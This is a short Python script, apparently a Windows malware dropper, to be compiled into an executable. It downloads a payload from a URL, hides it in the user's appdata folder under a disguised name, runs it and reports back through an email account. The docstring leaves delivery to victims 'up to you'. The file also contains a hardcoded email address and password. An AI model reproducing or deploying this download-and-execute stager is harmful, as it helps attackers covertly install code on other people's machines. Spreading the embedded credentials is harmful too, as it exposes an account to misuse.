#!/usr/bin/env python3
""" payload_to_windows.py

Author: Sam Hilliard

Implementation of deliver_payload module used to download a specified
payload to a windows machine.
This file is to be compiled into a windows executable.
Method of delivery is up to you :).
"""

import deliver_payload, os

# creates a discrete path for the executable to be stored at
def create_path():
    path = os.environ['appdata']
    os.chdir(path)
    try:
        os.mkdir('Default')
    except FileExistsError:
        pass
    path += '\\Default\\default_init.exe'

    return path

def main():
    url = 'https://www.python.org/ftp/python/3.9.2/python-3.9.2-amd64.exe'
    email = 'smittyw580@gmail.com'
    password = '9ZEiewHN3pFHH3B5'
    payload_name = 'test'
    path = create_path()
   
    payload = deliver_payload.DeliverPayload(url, email, password, payload_name, path)
    download_status = payload.download_file()
    payload.execute()

    payload.report(download_status) 

if __name__ == '__main__':
    main()